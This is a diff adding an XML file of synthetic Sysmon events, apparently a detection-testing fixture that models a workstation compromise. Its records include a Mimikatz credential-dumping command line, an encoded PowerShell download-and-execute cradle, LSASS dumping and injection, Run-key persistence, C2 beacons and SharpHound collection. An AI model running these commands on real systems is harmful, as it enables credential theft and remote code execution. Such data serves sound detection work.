@@ -1,0 +1,134 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<Events>
+
+<!-- ══ SYSMON EVENT 1: Process Create — Mimikatz ══ -->
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+ <System><EventID>1</EventID><TimeCreated SystemTime="2024-01-10T09:20:00.000Z"/><Computer>WORKSTATION01</Computer><Channel>Microsoft-Windows-Sysmon/Operational</Channel></System>
+ <EventData>
+  <Data Name="Image">C:\Users\john.doe\Downloads\mimikatz.exe</Data>
+  <Data Name="CommandLine">mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit</Data>
+  <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
+  <Data Name="User">CORP\john.doe</Data>
+  <Data Name="Hashes">MD5=96B86B4E4AEE2B44B5C8035EB1A35516,SHA256=92A4B89DC114F0F8C09DE9D2A72EED97BD7D0CD3AE9C7E5FBB2A48B53E79643</Data>
+ </EventData>
+</Event>
+
+<!-- ══ SYSMON EVENT 1: PowerShell encoded command ══ -->
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+ <System><EventID>1</EventID><TimeCreated SystemTime="2024-01-10T09:21:00.000Z"/><Computer>WORKSTATION01</Computer><Channel>Microsoft-Windows-Sysmon/Operational</Channel></System>
+ <EventData>
+  <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+  <Data Name="CommandLine">powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEAMAAuADUALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA==</Data>
+  <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
+  <Data Name="User">CORP\john.doe</Data>
+  <Data Name="Hashes">MD5=CDA48FC75952AD12D99E526D0B6BF70A</Data>
+ </EventData>
+</Event>
+
+<!-- ══ SYSMON EVENT 3: Network Connection — C2 Beacon ══ -->
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+ <System><EventID>3</EventID><TimeCreated SystemTime="2024-01-10T09:22:00.000Z"/><Computer>WORKSTATION01</Computer><Channel>Microsoft-Windows-Sysmon/Operational</Channel></System>
+ <EventData>
+  <Data Name="Image">C:\Windows\Temp\svchost32.exe</Data>
+  <Data Name="User">CORP\john.doe</Data>
+  <Data Name="SourceIp">10.10.0.5</Data>
+  <Data Name="SourcePort">49152</Data>
+  <Data Name="DestinationIp">185.220.101.34</Data>
+  <Data Name="DestinationPort">443</Data>
+  <Data Name="Protocol">tcp</Data>
+ </EventData>
+</Event>
+
+<!-- ══ SYSMON EVENT 8: CreateRemoteThread — Process Injection ══ -->
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+ <System><EventID>8</EventID><TimeCreated SystemTime="2024-01-10T09:23:00.000Z"/><Computer>WORKSTATION01</Computer><Channel>Microsoft-Windows-Sysmon/Operational</Channel></System>
+ <EventData>
+  <Data Name="SourceImage">C:\Windows\Temp\svchost32.exe</Data>
+  <Data Name="TargetImage">C:\Windows\System32\lsass.exe</Data>
+  <Data Name="SourceUser">CORP\john.doe</Data>
+  <Data Name="NewThreadId">1234</Data>
+  <Data Name="StartAddress">0x7FFB12340000</Data>
+ </EventData>
+</Event>
+
+<!-- ══ SYSMON EVENT 10: ProcessAccess — LSASS Dump ══ -->
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+ <System><EventID>10</EventID><TimeCreated SystemTime="2024-01-10T09:24:00.000Z"/><Computer>WORKSTATION01</Computer><Channel>Microsoft-Windows-Sysmon/Operational</Channel></System>
+ <EventData>
+  <Data Name="SourceImage">C:\Users\john.doe\Downloads\procdump.exe</Data>
+  <Data Name="TargetImage">C:\Windows\System32\lsass.exe</Data>
+  <Data Name="SourceUser">CORP\john.doe</Data>
+  <Data Name="GrantedAccess">0x1FFFFF</Data>
+  <Data Name="CallTrace">C:\Windows\SYSTEM32\ntdll.dll|C:\Windows\system32\KERNELBASE.dll</Data>
+ </EventData>
+</Event>
+
+<!-- ══ SYSMON EVENT 11: FileCreate — Dropper ══ -->
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+ <System><EventID>11</EventID><TimeCreated SystemTime="2024-01-10T09:25:00.000Z"/><Computer>WORKSTATION01</Computer><Channel>Microsoft-Windows-Sysmon/Operational</Channel></System>
+ <EventData>
+  <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+  <Data Name="TargetFilename">C:\Windows\Temp\payload.exe</Data>
+  <Data Name="User">CORP\john.doe</Data>
+  <Data Name="Hashes">MD5=AABBCCDDEEFF00112233445566778899</Data>
+ </EventData>
+</Event>
+
+<!-- ══ SYSMON EVENT 12: RegistryEvent — Run Key Persistence ══ -->
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+ <System><EventID>12</EventID><TimeCreated SystemTime="2024-01-10T09:26:00.000Z"/><Computer>WORKSTATION01</Computer><Channel>Microsoft-Windows-Sysmon/Operational</Channel></System>
+ <EventData>
+  <Data Name="Image">C:\Windows\Temp\payload.exe</Data>
+  <Data Name="TargetObject">HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Updater</Data>
+  <Data Name="User">CORP\john.doe</Data>
+ </EventData>
+</Event>
+
+<!-- ══ SYSMON EVENT 13: RegistryEvent — Value Set ══ -->
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+ <System><EventID>13</EventID><TimeCreated SystemTime="2024-01-10T09:27:00.000Z"/><Computer>WORKSTATION01</Computer><Channel>Microsoft-Windows-Sysmon/Operational</Channel></System>
+ <EventData>
+  <Data Name="Image">C:\Windows\Temp\payload.exe</Data>
+  <Data Name="TargetObject">HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Updater</Data>
+  <Data Name="Details">C:\Windows\Temp\payload.exe --hidden --persist</Data>
+  <Data Name="User">CORP\john.doe</Data>
+ </EventData>
+</Event>
+
+<!-- ══ SYSMON EVENT 22: DNS Query — C2 Domain Lookup ══ -->
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+ <System><EventID>22</EventID><TimeCreated SystemTime="2024-01-10T09:28:00.000Z"/><Computer>WORKSTATION01</Computer><Channel>Microsoft-Windows-Sysmon/Operational</Channel></System>
+ <EventData>
+  <Data Name="Image">C:\Windows\Temp\svchost32.exe</Data>
+  <Data Name="QueryName">update.evil-c2-domain.ru</Data>
+  <Data Name="QueryResults">185.220.101.34</Data>
+  <Data Name="User">CORP\john.doe</Data>
+ </EventData>
+</Event>
+
+<!-- ══ SYSMON EVENT 3: Network to another C2 ══ -->
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+ <System><EventID>3</EventID><TimeCreated SystemTime="2024-01-10T09:30:00.000Z"/><Computer>WORKSTATION01</Computer><Channel>Microsoft-Windows-Sysmon/Operational</Channel></System>
+ <EventData>
+  <Data Name="Image">C:\Windows\Temp\payload.exe</Data>
+  <Data Name="SourceIp">10.10.0.5</Data>
+  <Data Name="SourcePort">49200</Data>
+  <Data Name="DestinationIp">203.0.113.99</Data>
+  <Data Name="DestinationPort">4444</Data>
+  <Data Name="Protocol">tcp</Data>
+  <Data Name="User">CORP\john.doe</Data>
+ </EventData>
+</Event>
+
+<!-- ══ SYSMON EVENT 1: BloodHound/SharpHound ══ -->
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+ <System><EventID>1</EventID><TimeCreated SystemTime="2024-01-10T09:35:00.000Z"/><Computer>WORKSTATION01</Computer><Channel>Microsoft-Windows-Sysmon/Operational</Channel></System>
+ <EventData>
+  <Data Name="Image">C:\Users\john.doe\Desktop\SharpHound.exe</Data>
+  <Data Name="CommandLine">SharpHound.exe -c All --zipfilename loot.zip</Data>
+  <Data Name="User">CORP\john.doe</Data>
+  <Data Name="Hashes">MD5=1A2B3C4D5E6F7A8B9C0D1E2F3A4B5C6D</Data>
+ </EventData>
+</Event>
+
+</Events>
